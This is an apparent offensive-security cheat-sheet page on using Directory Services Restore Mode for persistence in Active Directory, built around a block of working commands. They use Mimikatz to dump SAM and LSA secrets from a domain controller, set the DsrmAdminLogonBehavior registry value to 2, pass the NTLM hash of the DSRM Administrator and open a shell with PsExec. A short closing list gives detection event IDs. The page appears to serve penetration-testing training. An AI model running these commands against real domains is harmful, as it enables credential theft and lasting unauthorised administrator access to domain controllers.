---
title: "DSRM"
description: "Persistence using Directory Services Restore Mode (DSRM)."
lead: "Using DSRM for persistence in Active Directory with Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_persistence"
weight: 40
toc: true
---

## General

- DSRM is Directory Services Restore Mode
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password
- DSRM password (SafeModePassword) is required when a server is promoted to a DC and it is rarely changed
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC

## Exploitation

```powershell
# Dump DSRM password (needs DA privs)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc

# Compare the Administrator hash with the Administrator hash of below command
# The first on is the DSRM local Administrator
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc

# Need to change Logon Behavior for DSRM account before we can pass the hash to login
Enter-PSSession -ComputerName dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Pass the hash to login
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'

# Check if we can access the DC
ls \\dcorp-dc\c$

# Get shell
.\PsExec.exe -accepteula \\dcorp-dc cmd.exe
```

## Detection

- Event IDs:
  - 4657: Audit creation/change of HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ DsrmAdminLogonBehavior
  - 4624: Account Logon
  - 4634: Account Logoff
  - 4672: Admin Logon
